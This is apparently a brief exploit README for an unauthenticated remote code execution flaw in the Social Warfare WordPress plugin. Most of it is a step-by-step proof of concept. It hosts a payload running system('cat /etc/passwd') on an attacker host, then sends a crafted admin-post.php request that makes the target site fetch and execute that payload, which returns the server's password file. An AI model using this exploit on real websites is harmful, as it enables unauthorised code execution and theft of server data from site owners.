# RCE-Social-Warfer

This Is For Social Warfer RCE Exploit
https://wpvulndb.com/vulnerabilities/9259
Description	
Unauthenticated remote code execution has been discovered in functionality that handles settings import.
Proof of Concept	
1. Create payload file and host it on a location accessible by a targeted website. Payload content : "<pre>system('cat /etc/passwd')</pre>"

2. Visit http://WEBSITE/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://ATTACKER_HOST/payload.txt

3. Content of /etc/passwd will be returned
